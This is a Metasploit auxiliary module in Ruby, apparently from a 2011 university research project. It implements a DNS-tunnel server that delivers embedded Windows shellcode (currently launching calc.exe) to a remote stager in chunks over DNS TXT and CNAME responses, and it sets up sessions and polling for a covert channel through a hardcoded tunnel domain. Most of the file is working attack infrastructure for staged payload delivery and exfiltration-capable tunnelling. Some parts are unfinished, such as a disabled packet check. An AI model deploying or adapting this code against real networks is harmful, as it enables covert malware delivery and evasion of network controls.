####################################
# Stand-alone DNS-tunnel server for testing purposes.
# Daan Raman
# Universiteit Gent, 2011
####################################

require 'msf/core'
require 'resolv'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report

  LOCALPORT = 44444
  DOMAIN = 'azertontunnel.chickenkiller.com'
  CHUNKSIZE = 64

  @receiveThreads = Array.new
  
  #Create queue that will store outgoing data
  @outgoingqueue = []
  
	def initialize
    
    @numOfSessions = 0

    #Currently this stage is calc.exe for testing purposes
    @stage = #31
      "\x31\xf6\x56\x64\x8b\x76\x30\x8b\x76\x0c\x8b\x76" +
      "\x1c\x8b\x6e\x08\x8b\x36\x8b\x5d\x3c\x8b\x5c\x1d" +
      "\x78\x01\xeb\x8b\x4b\x18\x67\xe3\xec\x8b\x7b\x20" +
      "\x01\xef\x8b\x7c\x8f\xfc\x01\xef\x31\xc0\x99\x32" +
      "\x17\x66\xc1\xca\x01\xae\x75\xf7\x66\x81\xfa\x10" +
      "\xf5\xe0\xe2\x75\xcc\x8b\x53\x24\x01\xea\x0f\xb7" +
      "\x14\x4a\x8b\x7b\x1c\x01\xef\x03\x2c\x97\x68\x2e" +
      "\x65\x78\x65\x68\x63\x61\x6c\x63\x54\x87\x04\x24" +
      "\x50\xff\xd5\xcc"

    
  
		super(
			'Name'        => 'Tunnel DNS Server',
			'Version'     => '$Revision: 10394 $',
			'Description'    => %q{
				This module provides a DNS service that redirects
			all queries to a particular address.
			},
			'Author'      => ['ddz', 'hdm', 'azerton'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
					[ 'Service' ]
				],
			'PassiveActions' =>
				[
					'Service'
				],
			'DefaultAction'  => 'Service'
		)

		register_options(
			[
				OptAddress.new('SRVHOST',   [ true, "The local host to listen on.", '0.0.0.0' ]),
				OptPort.new('SRVPORT',      [ true, "The local port to listen on.", 53 ]),
				OptAddress.new('TARGETHOST', [ false, "The address that all names should resolve to", nil ]),
				OptString.new('DOMAINBYPASS', [ true, "The list of domain names we want to fully resolve", 'www.google.com']),
				OptString.new('TUNNELDOMAIN', [ true, "The domain name for which we are authoritative DNS server", 'azerton.chickenkiller.com']),
			], self.class)

		register_advanced_options(
			[
				OptBool.new('LogConsole', [ false, "Determines whether to log all request to the console", true]),
				OptBool.new('LogDatabase', [ false, "Determines whether to log all request to the database", false]),
			], self.class)	
	end
  
  #Currently NetBios encoding
  #This method is also responsible for splitting up labels in case a label is bigger than 63 octets.
  def encode_data(data)
  	result = ''
  	label_counter = 0

  	data.each_byte{|b|
  		#Check if we need to start a new label or not
  		if(label_counter > 0 && label_counter % 60 == 0)
  			result = result + "."
  			label_counter = 0
  		else
  			label_counter = label_counter + 2
  		end
  		result = result + ((b >> 4) + 0x41).chr + ((b & 0xF) + 0x41).chr
  	}	

  	#puts "Encoded data is #{result} (original: #{data})"
  	return result
  end
  
  def encode_data_no_splitting(data)
  	result = ''
  	
  	data.each_byte{|b|
  		result = result + ((b >> 4) + 0x41).chr + ((b & 0xF) + 0x41).chr
  	}	

  	return result
  end
  
  def encode_array_data(data)
  	result = ''
  	label_counter = 0

    data.length.times do |i|
  		#Check if we need to start a new label or not
  		if(label_counter > 0 && label_counter % 60 == 0)
  			result = result + "."
  			label_counter = 0
  		else
  			label_counter = label_counter + 2
  		end
  		result = result + ((data[i] >> 4) + 0x41).chr + ((data[i] & 0xF) + 0x41).chr
  	end

  	return result
  end
  
  #Currently NetBios decoding
  def decode_array_data(data)
  	result = Array.new
  	counter = 0
  	first_nibble = ''
  	second_nibble = ''
  	
    data.length.times do |i|

  		if(counter % 2 == 0) then
  			first_nibble = data[i] - 0x41
  		else
  			second_nibble = data[i] - 0x41
  		end
      
  		counter = counter + 1

  		if(counter >= 1  && counter.modulo(2) ==0) then
  		  nextChar = ((first_nibble << 4) | second_nibble)
        print_status("0x#{nextChar.to_s(16)}")
  			result << nextChar
  		end
  	end
  	return result
  end
  
  #Currently NetBios decoding
  def decode_data(data)
  	result = ''
  	counter = 0
  	first_nibble = ''
  	second_nibble = ''
  	data.each_byte{|b|

  		if(counter % 2 == 0) then
  			first_nibble = b - 0x41
  		else
  			second_nibble = b - 0x41
  		end

  		counter = counter + 1

  		if(counter >= 1  && counter.modulo(2) ==0) then
  			result = result + ((first_nibble << 4) | second_nibble).chr

  		end

  	}	
  	return result
  end
  
  #Create garbage to prevent DNS caching
  def create_garbage
  	#Create random chunck of data - this is just a number between 0 and 100 for now
  	garbage = rand(100)
  end
  
  def isTunneledDNSpacket(url)
    #Part of tunneled domain?
    if not url.to_s.ends_with?(DOMAIN) 
      print_status("Ignoring a non-tunneled packet")
      return false
    end
    #First of all make sure the format is sessionID.sequenceNumber.garbage.[encoded_data.encoded_data...].domain
    domainparts = DOMAIN.to_s.split(".")
    urlparts =  url.to_s.split(".")
    
    nrOfDataParts = urlparts.length - domainparts.length
    
    #There must be at least a session, sequence number, garbage and payload part in the URL
    if(nrOfDataParts >= 4)
      return true
    else
      return false
    end
  end
  
  #Return true if this is a new session request, false otherwise
  #We already know that this is a tunneled package with a correct format
  def isRequestForNewSession(url)
    if(getDecodedPayload(url).eql?("INIT_SESSION"))
      return true
    else
      return false
    end
  end
  
  def setupNewSession(name, request, addr)
    print_status("Creating new session [#{@numOfSessions}]")
    answer = Resolv::DNS::Resource::IN::CNAME.new( @numOfSessions.to_s + ".0." + create_garbage.to_s + "." + encode_data("SESSION_OK") +"." + DOMAIN )
    request.add_answer(name, 60, answer)
    
    @numOfSessions = @numOfSessions + 1
    @sock.send(request.encode(), 0, addr[3], addr[1])
  end
  
  
  def getSessionID(url)
     urlparts =  url.to_s.split(".")
     return urlparts[0]
  end
  
  def getSequenceNr(url)
    urlparts =  url.to_s.split(".")
    return urlparts[1]
	end
	
  def getDecodedPayload(url)
    domainparts = DOMAIN.to_s.split(".")
    urlparts =  url.to_s.split(".")
    
    #-3 for session ID, sequence number and garbage
    nrOfPayloadParts = urlparts.length - domainparts.length - 3
    
    payload = ''
    (1..nrOfPayloadParts).each do |i|
      payload = payload + decode_data(urlparts[i+2])
    end
    
    return payload
    
  end
  
  #Extracts the payload from the URL without decoding it.
  #This is useful for example when communicating with the stager, since
  #this saves up precious bytes in the stager code.
  def getRawPayload(url)
    domainparts = DOMAIN.to_s.split(".")
    urlparts =  url.to_s.split(".")

    #-3 for session ID, sequence number and garbage
    nrOfPayloadParts = urlparts.length - domainparts.length - 3

    payload = ''
    (1..nrOfPayloadParts).each do |i|
      payload = payload + urlparts[i+2]
    end

    return payload
  end
  
  def isPollingQuery(url)
    if (getDecodedPayload(url).eql?("POLLING"))
      return true
    else
      return false
    end
  end
  
  def isRequesForPayload(url)
    if(getDecodedPayload(url).eql?("REQUEST_PAYLOAD"))
      return true
    else
      return false
    end
  end
  
  def stagerRequestingStage(url)
    #Stager queries look like <seq>.domainname
    urlnames = url.to_s.split(".")
    domainnames = DOMAIN.to_s.split(".")
    
    if(urlnames.size() == domainnames.size()+1)
      return true
    else
      return false
    end
  end
  
  def sendStagePart(name, request, addr)
    names = name.to_s.split('.')
    partNum = names[0]
    
    totalParts = @stage.size() / CHUNKSIZE

    #while((partNum.to_i) * CHUNKSIZE + i < @stage.size() && i < CHUNKSIZE)
    #  data =  data.to_s + @stage[(partNum.to_i) * CHUNKSIZE + i].to_s
    #  i = i + 1
    #end
    
    data = @stage[partNum.to_i * CHUNKSIZE, CHUNKSIZE]
    
    if(data != nil && data.size() > 0)
      
      encdata = encode_data_no_splitting(data)
      answer = Resolv::DNS::Resource::IN::TXT.new(encdata)
      request.add_answer(name, 60, answer)
      
      print_status("Sending off stage part #{partNum} /  #{totalParts} to remote stager - #{encdata}")
      @sock.send(request.encode(), 0, addr[3], addr[1])
      
    else
      print_status("Informing the stager that all stage code was sent over...")
      #return 3;
    end  
  end
    
  def sendPayloadPart(name, request, addr)
    
    partNum = getSequenceNr(name)
    sessionID = getSessionID(name)
    
    data = Array.new
    
    i = 0
    
    while((partNum.to_i - 1) * CHUNKSIZE + i < @stage.size() && i < CHUNKSIZE)
      data.push(@stage[(partNum.to_i - 1) * CHUNKSIZE + i])
      i = i + 1
    end
    
    if(data.size() == 0)
      data = "EOF"
    end
    
    
    #decode_array_data(encode_array_data(data))
    
    query = sessionID.to_s + "." + partNum + "." + create_garbage.to_s + "." + encode_array_data(data) + "." + DOMAIN
    print_status("Sending off part #{partNum} of payload to sessionID #{sessionID} - #{query}")
    answer = Resolv::DNS::Resource::IN::CNAME.new(query)
    request.add_answer(name, 60, answer)
    @sock.send(request.encode(), 0, addr[3], addr[1])
  end
  
  
	def run
	  #Extract the domain name we are using to tunnel - we should be authoritative DNS for this domain,
	  #since we want all records for this subdomain to arrive recursively in this script.
	  
		@targ = datastore['TARGETHOST']
		if(@targ and @targ.strip.length == 0)
			@targ = nil
		end

		if(@targ)
			@targ = ::Rex::Socket.resolv_to_dotted(@targ)
		end

		@port = datastore['SRVPORT'].to_i

		@log_console  = false
		@log_database = false

		if (datastore['LogConsole'].to_s.match(/^(t|y|1)/i))
			@log_console = true
		end

		if (datastore['LogDatabase'].to_s.match(/^(t|y|1)/i))
			@log_database = true
		end

		# MacOS X workaround
		::Socket.do_not_reverse_lookup = true

		print_status("DNS server initializing (Daan Raman, universiteit Gent)")
		@sock = ::UDPSocket.new()
		@sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
		@sock.bind(datastore['SRVHOST'], @port)
		@run = true
		@domain_bypass_list = datastore['DOMAINBYPASS'].split

		print_status("DNS server started")
		
	
    
    @sendThreads = Array.new
    
		begin

		while @run
			packet, addr = @sock.recvfrom(65535)
			break if packet.length == 0

			request = Resolv::DNS::Message.decode(packet)

			lst = []
      
      #Iterate over all the DNS requests in the query
			request.each_question {|name, typeclass|
				tc_s = typeclass.to_s().gsub(/^Resolv::DNS::Resource::/, "")
        
        #Query response flag
				request.qr = 1
				#Recursion available flag
				request.ra = 1
        
				lst << "#{tc_s} #{name}"
				
				#PART 1 - COMMUNICATION WITH STAGER
			  if stagerRequestingStage(name)
			    sendStagePart(name, request, addr)
			    next
			  end
			  
				#Get all fields from the query
				sessionID = getSessionID(name)
				sequenceNr = getSequenceNr(name)
				payload = getDecodedPayload(name)
				
				#Make sure we are processing a DNS query from our own tunnel, that has the correct format
			  if  !isTunneledDNSpacket(name)
			    #next
			  end
			  
			  #PART 2 - COMMUNICATION WITH STAGE
			  #Check if this is a request for a new session
			  if isRequestForNewSession(name) 
			    setupNewSession(name, request, addr)
			    next
			  end
			  
			  if isRequesForPayload(name)
			    sendPayloadPart(name, request, addr)
			    next
			  end
			  
				case tc_s
			  
		    when 'IN::CNAME'
          
          if(isPollingQuery(name))
            print_status("DEBUG: Received polling query")
            answer = Resolv::DNS::Resource::IN::CNAME.new( sessionID + ".0." + create_garbage.to_s + "." + encode_data("NODATA") +"." + DOMAIN )
            
            if(@outgoingqueue.size > 0)
              print_status("DEBUG: We should send over data as a POLLING response")
            end
          else
            #No session setup, no polling question - this is real data from client to server
            answer = Resolv::DNS::Resource::IN::CNAME.new( sessionID + "." + sequenceNr  +"."+ create_garbage.to_s + "." + encode_data("ACK") +"." + DOMAIN )
            
          end
          
					request.add_answer(name, 60, answer)
		      
				when 'IN::A'
					#answer = Resolv::DNS::Resource::IN::A.new( @targ || ::Rex::Socket.source_address(addr[3].to_s) )
          answer = Resolv::DNS::Resource::IN::A.new( "10.20.30.40" )
          
					# Identify potential domain exceptions
					#@domain_bypass_list.each do |ex|
					#	if (name.to_s <=> ex) == 0
							# Resolve the exception domain
							#ip = Resolv::DNS.new().getaddress("www.google.com").to_s
							#answer = Resolv::DNS::Resource::IN::A.new( ip )
					#		if (@log_console)
					#			print_status("DNS bypass domain found: #{ex}")
					#			print_status("DNS bypass domain #{ex} resolved #{ip}")
					#		end
					#	end
					#end

					request.add_answer(name, 60, answer)
        
				when 'IN::MX'
					mx = Resolv::DNS::Resource::IN::MX.new(10, Resolv::DNS::Name.create("mail.#{name}"))
					ns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create("dns.#{name}"))
					ar = Resolv::DNS::Resource::IN::A.new( @targ || ::Rex::Socket.source_address(addr[3].to_s) )
					request.add_answer(name, 60, mx)
					request.add_authority(name, 60, ns)
					request.add_additional(Resolv::DNS::Name.create("mail.#{name}"), 60, ar)

				when 'IN::NS'
					ns = Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create("dns.#{name}"))
					ar = Resolv::DNS::Resource::IN::A.new( @targ || ::Rex::Socket.source_address(addr[3].to_s) )
					request.add_answer(name, 60, ns)
					request.add_additional(name, 60, ar)
				when 'IN::PTR'
					soa = Resolv::DNS::Resource::IN::SOA.new(
						Resolv::DNS::Name.create("ns.internet.com"),
						Resolv::DNS::Name.create("root.internet.com"),
						1,
						3600,
						3600,
						3600,
						3600
					)
					ans = Resolv::DNS::Resource::IN::PTR.new(
						Resolv::DNS::Name.create("www")
					)

					request.add_answer(name, 60, ans)
					request.add_authority(name, 60, soa)
				else
				  #Unknown DNS record type
					lst << "UNKNOWN #{tc_s}"
				end
			}

			if(@log_console)
				print_status("DNS #{addr[3]}:#{addr[1]} XID #{request.id} (#{lst.join(", ")})")
			end

			if(@log_database)
				report_note(
					:host => addr[3],
					:type => "dns_lookup",
					:data => "#{addr[3]}:#{addr[1]} XID #{request.id} (#{lst.join(", ")})"
				) if lst.length > 0
			end
      
      puts("IP Address #{addr[3]}")
      puts("Port #{addr[1]}")
			@sock.send(request.encode(), 0, addr[3], addr[1])
		end

		rescue ::Exception => e
			print_error("fakedns: #{e.class} #{e} #{e.backtrace}")
		# Make sure the socket gets closed on exit
		ensure
			@sock.close
		end
	end
end